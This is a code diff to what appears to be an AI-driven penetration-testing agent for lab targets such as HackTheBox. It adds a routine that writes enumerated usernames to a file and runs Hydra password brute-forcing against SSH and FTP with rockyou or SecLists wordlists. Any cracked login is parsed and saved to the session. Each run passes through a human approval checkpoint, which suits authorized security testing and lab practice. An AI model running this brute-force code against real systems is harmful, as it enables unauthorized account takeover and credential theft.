@@ -87,6 +87,11 @@ class EnumerationAgent(BaseAgent):
             if cr.approved:
                 approved_tasks.append({"name": "snmp", "command": f"snmpwalk -v2c -c public {ip}", "timeout": 60, "log_dir": self.output_dir})
 
+        # ── Hydra brute-force if usernames enumerated + login service ─
+        # Collect usernames already found from earlier stages
+        known_users = list({c.username for c in self.session.credentials if c.username})
+        # Also extract usernames from enum4linux output later — done in analysis phase
+
         # ── Run all approved tasks in parallel ────────────────────
         if approved_tasks:
             self.log(f"Running {len(approved_tasks)} enumeration task(s) in parallel...")
@@ -137,6 +142,12 @@ Respond with JSON:
             result.next_actions = analysis.get("attack_vectors", [])
             result.metadata = analysis
 
+            # ── Hydra brute-force if usernames + login-service found ─
+            llm_users = [u.strip() for u in analysis.get("usernames", []) if u and u.strip()]
+            all_users = list(dict.fromkeys(known_users + llm_users))
+            if all_users:
+                self._try_hydra_bruteforce(ip, all_users, result)
+
             cp.section("Enumeration Analysis")
             from rich.console import Console
             from rich.panel import Panel
@@ -150,3 +161,75 @@ Respond with JSON:
 
         result.summary = f"Enumerated {len(self.session.open_ports)} services. Found {len(self.session.credentials)} credentials."
         return result
+
+    # ── Hydra brute-force helper ─────────────────────────────────
+
+    HYDRA_WORDLISTS = [
+        "/usr/share/wordlists/rockyou.txt",
+        "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
+        "/usr/share/wordlists/fasttrack.txt",
+    ]
+
+    def _find_wordlist(self) -> str:
+        import os
+        for w in self.HYDRA_WORDLISTS:
+            if os.path.exists(w):
+                return w
+        return ""
+
+    def _try_hydra_bruteforce(self, ip: str, usernames: list[str], result) -> None:
+        """Run hydra against SSH/FTP with enumerated usernames + top password list."""
+        from pathlib import Path
+        wordlist = self._find_wordlist()
+        if not wordlist:
+            self.log("No password wordlist found (rockyou/seclists)", "warning")
+            return
+
+        # Determine attackable services
+        targets: list[tuple[str, int]] = []
+        for p in self.session.open_ports:
+            if p.service == "ssh" or p.number == 22:
+                targets.append(("ssh", p.number))
+            elif p.service == "ftp" or p.number == 21:
+                targets.append(("ftp", p.number))
+
+        if not targets:
+            return
+
+        # Write usernames to a file
+        users_file = Path(self.output_dir) / "hydra_users.txt"
+        users_file.write_text("\n".join(usernames[:20]))  # cap at 20
+
+        for svc, port in targets:
+            cr = self.checkpoint(
+                what_found=f"{svc.upper()} on port {port} + {len(usernames)} enumerated users",
+                plan=f"hydra brute-force with rockyou top passwords (capped)",
+                why=f"Enumerated usernames + weak-password wordlist = common HTB foothold. "
+                    f"Hydra will stop on first hit.",
+                what_to_look_for="[svc] host: X login: Y password: Z — indicates successful auth",
+                command=f"hydra -L {users_file} -P {wordlist} -f -t 4 -e nsr {svc}://{ip}:{port}",
+                risk="medium",
+            )
+            if not cr.approved:
+                continue
+
+            cmd = cr.override if cr.action == cp.CheckpointResult.MODIFIED else (
+                # -f: stop on first hit, -t 4: threads (be nice), -e nsr: try empty/reverse/same
+                # Small wordlist cap via head to keep it under 5 min
+                f"bash -c 'hydra -L {users_file} -P <(head -500 {wordlist}) "
+                f"-f -t 4 -e nsr -w 3 {svc}://{ip}:{port} 2>&1'"
+            )
+            self.log(f"Hydra brute-force on {svc}:{port} (limited to top 500 passwords)...")
+            r = run(cmd, timeout=300, log_dir=self.output_dir)
+            result.raw_outputs[f"hydra_{svc}_{port}"] = r.output
+
+            # Parse hit
+            import re
+            hit = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", r.output)
+            if hit:
+                from models import Credential
+                user, pwd = hit.group(1), hit.group(2)
+                cred = Credential(username=user, password=pwd, service=svc,
+                                  note=f"hydra brute on port {port}")
+                self.session.credentials.append(cred)
+                self.log(f"HYDRA HIT: {user}:{pwd} on {svc}:{port}", "success")
